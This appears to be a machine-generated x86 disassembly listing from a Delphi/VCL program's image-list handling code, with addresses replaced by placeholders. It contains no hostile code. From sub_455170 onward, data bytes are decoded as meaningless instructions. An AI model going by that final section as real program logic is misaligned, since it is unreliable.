mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_427218
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45414f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_428630
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454156
mov eax [ ebp - 0x10 ]
call sub_403270
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_4277e0
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_42477c
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_424b20
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_4277e0
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_42477c
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_424b20
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_453bc4
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_454198
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_453a88
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_453ff0
sub_4541b8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax ebx
call sub_453aec
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418b4c
mov eax ebx
call sub_453d40
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_4543a0
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_453a88
mov edx eax
mov eax ebx
call sub_453a24
mov eax ebx
call sub_45394c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_453a88
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_453954
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_453a88
push eax
call ImageList_GetBkColor
call sub_4537bc
mov edx eax
mov eax ebx
call sub_453d4c
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_454198
jmp r-xdata
sub_454278
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_418c30
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_4543a0
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_453d40
mov eax esi
call sub_453a88
mov edx eax
mov eax ebx
call sub_453a24
mov eax ebx
call sub_45394c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_453a88
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_453954
jmp r-xdata
mov eax esi
call sub_453a88
push eax
call ImageList_GetBkColor
call sub_4537bc
mov edx eax
mov eax ebx
call sub_453d4c
mov edx esi
mov eax ebx
call sub_454198
pop esi
pop ebx
retn
sub_454328
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_454394
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45439b
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_4543c8
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_418550
mov si 0xffff
call sub_40346c
inc ebp
dec edi
jne r-xdata
sub_454418
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418440
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418550
cmp ebp eax
jne r-xdata
sub_454470
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407e6c
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4544b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_453c90
mov ebx eax
mov eax edi
call sub_453c90
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_453c90
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_454590
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_454573
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_454470
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45457a
mov eax [ ebp - 0xc ]
call sub_403270
retn
mov eax edi
call sub_453c90
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_4545a4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_453c90
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4544b4
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_454600
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_420be4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_4545a4
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_454658
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_41ab94
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_41ab94
mov dl 0x1
mov eax [ r-xdata ]
call sub_427218
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4548dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41a968
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41a988
mov dl 0x1
mov eax [ r-xdata ]
call sub_427218
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4548bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_427218
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_427218
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_428630
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_416f14
mov eax [ ebp - 0x4 ]
call sub_454c84
xor eax eax
push ebp
push sub_4548a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4548a9
mov eax [ ebp - 0xc ]
call sub_403270
mov eax [ ebp - 0x14 ]
call sub_403270
mov eax [ ebp - 0x4 ]
call sub_454c88
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_416f3c
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4277e0
push eax
mov eax [ ebp - 0xc ]
call sub_4277e0
lea edx [ ebp - 0x30 ]
pop ecx
call sub_424614
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_416f3c
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4277e0
push eax
mov eax [ ebp - 0x14 ]
call sub_4277e0
lea edx [ ebp - 0x30 ]
pop ecx
call sub_424614
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_453bc4
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_4548ec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421364
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45494c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_453a5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454953
mov eax [ ebp - 0xc ]
call sub_403270
retn
sub eax 0xffffffec
sub_454953
mov eax [ ebp - 0x4 ]
call sub_45394c
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_454a82
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41a988
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41b090
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41a988
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403270
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_41a988
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421364
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_454a65
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_41a988
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_453a5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403270
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41a988
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_454ab4
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_453aec
mov eax edi
call sub_41a968
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_41a988
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_454658
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_4548ec
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_454b40
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_421364
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_454c3a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40bf00
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_453a88
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_453a88
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454c41
mov eax [ ebp - 0x4 ]
call sub_403270
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
jmp r-xdata
sub_454ca8
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
test bl bl
jle r-xdata
mov edx esi
call sub_454418
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_454cf4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_454d19
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454d20
retn
sub_455170
clc
push edx
push ecx
call [ eax - 0x74 ]
inc ebp
add [ eax - 0x7a ] dl
inc ebp
add [ eax ] ah
xchg [ ebp ] eax
pop eax
xchg [ ebp ] eax
ror [ ebx - 0x7453ffbb ] 0x45
add [ esp + eax * 4 + 0x54090045 ] ch
dec ebp
outsb
jne r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push es
add [ esi ] al
inc edx
inc ebx
push 0x706b6365
dec edi
inc ebp
add [ ebx ] bh
add [ eax ] al
jmp eax
arpl [ ebx + 0x70 ] bp
insd
mov al [ 0x7004551 ]
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
add [ eax ] al
inc [ ebp + eax * 4 - 0x722bffbb ]
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
xor [ ebp - 0x724bffbb ] al
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
add [ eax ] 0x0
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
jne r-xdata
inc ebp
add [ eax + eax ] bh
inc [ eax + 0x100458f ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530d000a ] al
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
insd
add al 0x51
inc ebp
add [ eax ] dl
insd
inc ecx
add [ eax ] bl
add [ 0x756e654d ] al
jae r-xdata
js r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
dec ebp
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
add [ eax ] al
add [ edx ] 0x0
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4000416e ] ah
xchg [ ebp ] al
fmul [ edx + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push esp
mov es [ ebp ]
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
hlt
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
adc [ eax ] al
cmp [ eax ] eax
add bh bh
test [ ebp - 0x722bffbb ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
adc [ eax ] al
cmp eax 0x24ff0000
mov [ ebp ] es
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0x3c6d6574
pop eax
dec ecx
outsb
js r-xdata
insb
adc [ eax ] al
aas
add [ eax ] al
insd
popad
jae r-xdata
outsb
jne r-xdata
imul ebp [ eax + edx + 0x300040 ] 0x0
inc eax
test [ ebp ] al
xchg esp eax
lea eax [ ebp ]
popad
jns r-xdata
cwde
inc ebx
jne r-xdata
or eax 0x72470a00
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edi
inc ecx
add [ eax + eax ] dl
call [ eax + eax ]
call [ esi + ecx * 4 ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
dec eax
insb
jo r-xdata
adc [ eax ] al
cmp al [ eax ]
add bh bh
js r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
pop es
inc ebx
popad
jo r-xdata
add bh bh
rol [ ebp + eax * 2 + 0x458d9400 ] 0x0
jo r-xdata
inc ecx
add ah bl
cmovb eax [ eax ]
lodsb [ esi ]
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
jmp [ eax + 0x74004586 ]
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
popad
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ 0x61657242 ] al
dec eax
add [ eax ] al
push [ eax + 0x1004584 ]
inc ebp
add [ eax + eax ] bh
add bh bh
pop esp
cwde
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
ja r-xdata
outsd
dec ecx
je r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
pop es
inc ebx
push 0x656b6365
jo r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
push [ eax ]
test [ ebp ] eax
mov ah 0x8d
imul esi [ ebp + ebp * 2 + 0x61 ] 0x454d8470
add [ eax ] cl
add bh bh
mov al 0x84
inc ebp
add [ ecx ] al
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
xor [ edx ] ch
inc edx
add [ edx + ecx * 4 - 0x74b3ffbb ] dh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060006 ] al
add [ esi + 0x55 ] dh
je r-xdata
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
inc ecx
add [ eax ] ah
add bh bh
mov [ esi - 0x71abffbb ] es
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
insd
cmp al 0x58
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ eax - 0x67 ] ah
inc ebp
add [ eax ] dh
mov [ ecx ] es
in al 0xb
inc edx
add [ ebx + ecx * 4 + 0x41 ] cl
add [ eax + 0x240045a1 ] cl
mov [ 0xccc0045 ] al
inc edx
xor al 0x40
insd
add [ edi + 0x45 ] cl
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
add ah dl
or al 0x42
fmul [ edx + eax * 2 ]
jb r-xdata
add ah bh
cmovb eax [ eax ]
les ebx [ eax - 0x5e8fffbb ]
inc ebp
add [ ecx + ebx * 4 - 0x5e5fffbb ] dh
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] ch
add [ eax ] al
add eax [ eax ]
std
inc ebp
add [ edx + 0x58004555 ] cl
add [ eax ] al
add [ esp + ebp * 2 ] dl
jae r-xdata
add [ 0x654d6e4f ] cl
popad
je r-xdata
add ah al
or eax 0xff40042
inc edx
add ah bl
or al 0x42
inc ebp
add ah cl
dec ecx
je r-xdata
push ebp
inc ebp
add [ eax ] al
insd
mov [ esi + 0x45 ] cl
add [ eax - 0x67010000 ] bl
or al 0x42
add [ ebp + edx * 2 + 0x45 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
jbe r-xdata
insd
lea eax [ eax ]
sub [ ebp + 0x45 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edx * 2 + 0x45 ] ah
sub_45576d
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
je r-xdata
outsb
je r-xdata
xor [ eax + 0x45 ] bl
add [ 0x654c616d ] cl
je r-xdata
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x6004557 ] dh
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc465646f
dec ebp
inc ebp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
inc ebx
push 0x65676e61
nop
mov ah 0x57
inc ebp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jo r-xdata
pop eax
inc ebp
add [ ebp + 0x59000040 ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
hlt
dec ebp
outsb
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
jne r-xdata
xor al 0x58
jo r-xdata
